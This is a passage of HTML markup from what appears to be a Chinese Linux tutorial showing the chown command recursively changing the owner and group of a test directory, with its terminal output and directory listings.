&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;root &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2015&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587abc0e58baa592005261-18&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;root &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2016&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58baa592005261-19&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;root &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2017&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0079 seconds] --&gt;

&lt;/div&gt;
&lt;p class=&quot;p0&quot;&gt;&lt;strong&gt;说明：&lt;/strong&gt;&lt;/p&gt;
&lt;p class=&quot;p0&quot;&gt;&lt;strong&gt;实例4：改变指定目录以及其子目录下的所有文件的拥有者和群组 &lt;/strong&gt;&lt;/p&gt;
&lt;p class=&quot;p0&quot;&gt;&lt;strong&gt;命令：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587abc0e58bad629658525&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
chown -R -v root:mail test6&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58bad629658525-1&quot;&gt;1&lt;/div&gt;&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58bad629658525-1&quot;&gt;
&lt;span class=&quot;crayon-r&quot;&gt;chown&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;R&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;v&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0008 seconds] --&gt;
&lt;p&gt;&lt;/p&gt;
&lt;p class=&quot;p0&quot;&gt;&lt;strong&gt;输出：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587abc0e58bb1949228968&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
[root@localhost test]# ll
drwxr-xr-x 2 root users   4096 11-30 08:39 test6
[root@localhost test]# chown -R -v root:mail test6
“test6/log2014.log” 的所有者已更改为 root:mail
“test6/linklog.log” 的所有者已更改为 root:mail
“test6/log2015.log” 的所有者已更改为 root:mail
“test6/log2013.log” 的所有者已更改为 root:mail
“test6/log2012.log” 的所有者已保留为 root:mail
“test6/log2017.log” 的所有者已更改为 root:mail
“test6/log2016.log” 的所有者已更改为 root:mail
“test6” 的所有者已更改为 root:mail
[root@localhost test]# ll
drwxr-xr-x 2 root mail   4096 11-30 08:39 test6
[root@localhost test]# cd test6
[root@localhost test6]# ll
总计 604
---xr--r-- 1 root mail 302108 11-30 08:39 linklog.log
---xr--r-- 1 root mail 302108 11-30 08:39 log2012.log
-rw-r--r-- 1 root mail     61 11-30 08:39 log2013.log
-rw-r--r-- 1 root mail      0 11-30 08:39 log2014.log
-rw-r--r-- 1 root mail      0 11-30 08:39 log2015.log
-rw-r--r-- 1 root mail      0 11-30 08:39 log2016.log
-rw-r--r-- 1 root mail      0 11-30 08:39 log2017.log&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58bb1949228968-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587abc0e58bb1949228968-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58bb1949228968-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587abc0e58bb1949228968-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58bb1949228968-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587abc0e58bb1949228968-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58bb1949228968-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587abc0e58bb1949228968-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58bb1949228968-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587abc0e58bb1949228968-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58bb1949228968-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587abc0e58bb1949228968-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58bb1949228968-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587abc0e58bb1949228968-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58bb1949228968-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587abc0e58bb1949228968-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58bb1949228968-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587abc0e58bb1949228968-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58bb1949228968-19&quot;&gt;19&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587abc0e58bb1949228968-20&quot;&gt;20&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58bb1949228968-21&quot;&gt;21&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587abc0e58bb1949228968-22&quot;&gt;22&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58bb1949228968-23&quot;&gt;23&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58bb1949228968-1&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;localhost &lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# ll&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587abc0e58bb1949228968-2&quot;&gt;
&lt;span class=&quot;crayon-v&quot;&gt;drwxr&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;root &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;4096&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;test6&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58bb1949228968-3&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;localhost &lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# chown -R -v root:mail test6&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587abc0e58bb1949228968-4&quot;&gt;“&lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2014&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;”&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;的所有者已更改为&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58bb1949228968-5&quot;&gt;“&lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;linklog&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;”&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;的所有者已更改为&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587abc0e58bb1949228968-6&quot;&gt;“&lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2015&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;”&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;的所有者已更改为&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58bb1949228968-7&quot;&gt;“&lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;”&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;的所有者已更改为&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587abc0e58bb1949228968-8&quot;&gt;“&lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2012&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;”&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;的所有者已保留为&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58bb1949228968-9&quot;&gt;“&lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2017&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;”&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;的所有者已更改为&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587abc0e58bb1949228968-10&quot;&gt;“&lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2016&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;”&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;的所有者已更改为&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58bb1949228968-11&quot;&gt;“&lt;span class=&quot;crayon-i&quot;&gt;test6&lt;/span&gt;”&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;的所有者已更改为&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587abc0e58bb1949228968-12&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;localhost &lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# ll&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58bb1949228968-13&quot;&gt;
&lt;span class=&quot;crayon-v&quot;&gt;drwxr&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;root &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;4096&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;test6&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587abc0e58bb1949228968-14&quot;&gt;
